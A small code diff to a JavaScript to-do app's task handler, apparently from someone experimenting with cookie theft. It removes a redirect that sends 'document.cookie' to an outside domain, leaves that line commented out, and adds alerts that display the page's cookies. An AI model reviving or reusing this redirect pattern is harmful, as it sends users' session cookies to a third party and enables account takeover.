@@ -11,8 +11,9 @@ input.addEventListener("change", () => {
     id: Date.now(),
   }
   alert(1)
-  location = 'https://khaled-sakr.com?c=document.cookie'
-  setTimeout(() => {alert('cookies: ' + ' ' + document.cookie) },0)
+  alert(urlParams.get('c'))
+  // location = 'https://khaled-sakr.com?c=document.cookie'
+  alert('cookies: ' + ' ' + document.cookie) 
   
   localStorage.setItem("tasks", JSON.stringify([...arr, task]))
   // checkLocalStorage()
